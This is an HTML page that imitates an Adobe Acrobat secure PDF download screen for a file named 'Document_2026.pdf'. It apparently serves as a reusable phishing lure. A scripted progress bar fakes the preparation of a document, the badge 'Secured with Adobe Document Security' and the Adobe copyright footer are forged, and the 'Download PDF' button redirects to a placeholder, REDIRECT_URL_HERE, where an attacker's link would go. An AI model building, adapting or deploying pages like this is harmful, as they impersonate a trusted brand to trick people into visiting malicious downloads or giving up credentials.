<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe Acrobat - Secure PDF Download</title>
    <link rel="icon" href="https://www.adobe.com/favicon.ico">
    <style>
        @page { size: A4; margin: 0; }

        *, *::before, *::after {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f0f2f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Header */
        .header {
            background: #fff;
            height: 54px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 28px;
            border-bottom: 1px solid #e2e2e2;
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .header-left svg {
            width: 24px;
            height: 20px;
        }

        .header-title {
            font-size: 15px;
            font-weight: 700;
            color: #222;
        }

        .header-right a {
            font-size: 13px;
            color: #1473e6;
            text-decoration: none;
            font-weight: 600;
        }

        .header-right a:hover {
            text-decoration: underline;
        }

        /* Main */
        .main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }

        .card {
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 1px 4px rgba(0,0,0,0.06), 0 6px 24px rgba(0,0,0,0.05);
            max-width: 440px;
            width: 100%;
            padding: 44px 36px;
            text-align: center;
        }

        .icon-row {
            margin-bottom: 24px;
        }

        .icon-row svg {
            width: 72px;
            height: 88px;
        }

        .card h1 {
            font-size: 18px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 6px;
        }

        .file-meta {
            font-size: 13px;
            color: #888;
            margin-bottom: 28px;
        }

        .file-meta span {
            margin: 0 4px;
            color: #ccc;
        }

        /* Progress */
        .progress-area {
            margin-bottom: 24px;
        }

        .progress-track {
            height: 4px;
            background: #e8e8e8;
            border-radius: 2px;
            overflow: hidden;
            margin-bottom: 10px;
        }

        .progress-bar {
            height: 100%;
            background: #1473e6;
            border-radius: 2px;
            width: 0%;
            animation: fill 3s ease-out forwards;
        }

        @keyframes fill {
            0% { width: 0; }
            100% { width: 100%; }
        }

        .progress-text {
            font-size: 12px;
            color: #999;
        }

        .progress-text strong {
            color: #333;
        }

        /* Button */
        .dl-btn {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: #1473e6;
            color: #fff;
            border: none;
            border-radius: 20px;
            padding: 12px 32px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            opacity: 0;
            animation: fadeIn 0.4s ease forwards 3.2s;
        }

        .dl-btn:hover {
            background: #0d66d0;
        }

        .dl-btn svg {
            width: 16px;
            height: 16px;
        }

        @keyframes fadeIn {
            to { opacity: 1; }
        }

        .security-note {
            margin-top: 18px;
            font-size: 11px;
            color: #b0b0b0;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }

        .security-note svg {
            width: 13px;
            height: 13px;
            fill: #b0b0b0;
        }

        /* Footer */
        .footer {
            text-align: center;
            padding: 16px;
            font-size: 11px;
            color: #bbb;
        }

        .footer a {
            color: #bbb;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        @media print {
            body { background: #fff; }
            .card { box-shadow: none; border: 1px solid #ddd; }
            .dl-btn { opacity: 1; animation: none; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
            .progress-bar { width: 100%; animation: none; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
        }
        /* ---------- PDF-style paged rendering ---------- */
        html {
            background: #525659;
        }
        body {
            background: #525659;
            overflow-x: auto;
        }
        .pdf-viewport {
            width: 100%;
            min-height: 100vh;
            padding: 24px 16px 40px;
            display: flex;
            justify-content: center;
            box-sizing: border-box;
        }
        .pdf-sheet {
            --pdf-page-h: 1123px; /* ~A4 height at 96dpi */
            position: relative;
            width: min(960px, 100%);
            background: #ffffff;
            box-shadow: 0 6px 22px rgba(0, 0, 0, 0.45), 0 2px 6px rgba(0, 0, 0, 0.25);
            border-radius: 2px;
            min-height: var(--pdf-page-h);
            overflow: hidden;
        }
        .pdf-sheet::before {
            content: "";
            position: absolute;
            inset: 0;
            pointer-events: none;
            background-image: repeating-linear-gradient(
                to bottom,
                transparent 0 calc(var(--pdf-page-h) - 2px),
                rgba(0, 0, 0, 0.18) calc(var(--pdf-page-h) - 2px) calc(var(--pdf-page-h) - 1px),
                rgba(0, 0, 0, 0.32) calc(var(--pdf-page-h) - 1px) var(--pdf-page-h)
            );
            z-index: 9999;
        }
        @media print {
            html, body { background: #ffffff; }
            .pdf-viewport { padding: 0; display: block; }
            .pdf-sheet { width: auto; box-shadow: none; min-height: 0; overflow: visible; }
            .pdf-sheet::before { display: none; }
        }
    </style>
</head>
<body>
    <div class="pdf-viewport"><div class="pdf-sheet">
    <header class="header">
        <div class="header-left">
            <svg viewBox="0 0 30 26" fill="none">
                <path d="M11.5 0H0V26L11.5 0Z" fill="#EB1000"/>
                <path d="M18.5 0H30V26L18.5 0Z" fill="#EB1000"/>
                <path d="M15 9.6L22.1 26H17.5L15.3 20.5H10L15 9.6Z" fill="#EB1000"/>
            </svg>
            <span class="header-title">Adobe Acrobat</span>
        </div>
        <div class="header-right">
            <a href="#">Sign in</a>
        </div>
    </header>

    <main class="main">
        <div class="card">
            <div class="icon-row">
                <svg viewBox="0 0 72 88" fill="none">
                    <path d="M0 6C0 2.69 2.69 0 6 0H44L72 28V82C72 85.31 69.31 88 66 88H6C2.69 88 0 85.31 0 82V6Z" fill="#F5F5F8" stroke="#E0E0E0" stroke-width="1"/>
                    <path d="M44 0L72 28H50C46.69 28 44 25.31 44 22V0Z" fill="#E0E0E0"/>
                    <rect x="14" y="46" rx="2" width="44" height="5" fill="#DBDBE0"/>
                    <rect x="14" y="58" rx="2" width="32" height="5" fill="#DBDBE0"/>
                    <rect x="14" y="70" rx="2" width="38" height="5" fill="#DBDBE0"/>
                    <text x="36" y="36" text-anchor="middle" fill="#1473e6" font-size="14" font-weight="700" font-family="sans-serif">PDF</text>
                </svg>
            </div>

            <h1>Document_2026.pdf</h1>
            <p class="file-meta">PDF <span>&middot;</span> 2.4 MB <span>&middot;</span> 12 pages</p>

            <div class="progress-area">
                <div class="progress-track">
                    <div class="progress-bar"></div>
                </div>
                <p class="progress-text" id="progressLabel">Preparing document&hellip; <strong id="pct">0%</strong></p>
            </div>

            <button class="dl-btn" onclick="window.location.href='REDIRECT_URL_HERE'">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/>
                    <polyline points="7 10 12 15 17 10"/>
                    <line x1="12" y1="15" x2="12" y2="3"/>
                </svg>
                Download PDF
            </button>

            <div class="security-note">
                <svg viewBox="0 0 24 24"><path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z"/></svg>
                Secured with Adobe Document Security
            </div>
        </div>
    </main>

    <footer class="footer">
        &copy; 2026 Adobe. All rights reserved. &middot;
        <a href="#">Privacy</a> &middot;
        <a href="#">Terms of Use</a>
    </footer>

    <script>
        (function() {
            var pct = document.getElementById('pct');
            var label = document.getElementById('progressLabel');
            var vals = [0, 10, 28, 50, 74, 100];
            vals.forEach(function(v, i) {
                setTimeout(function() {
                    pct.textContent = v + '%';
                    if (v === 100) label.innerHTML = 'Ready to download';
                }, i * 600);
            });
        })();
    </script>
    </div></div>
</body>
</html>
